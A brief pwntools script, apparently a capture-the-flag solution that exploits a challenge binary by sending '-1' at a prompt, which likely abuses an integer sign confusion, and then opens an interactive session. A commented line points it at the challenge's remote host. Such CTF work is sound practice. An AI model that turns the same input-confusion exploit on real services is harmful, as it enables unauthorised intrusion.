from pwn import *
#p=remote("fitsec-a-small-misunderstanding.chals.io", 443, ssl=True, sni="fitsec-a-small-misunderstanding.chals.io")
p = process("./asmallmisunderstanding.bin")
p.recvuntil(">>>")
p.sendline(b"%d"%-1)
p.interactive()
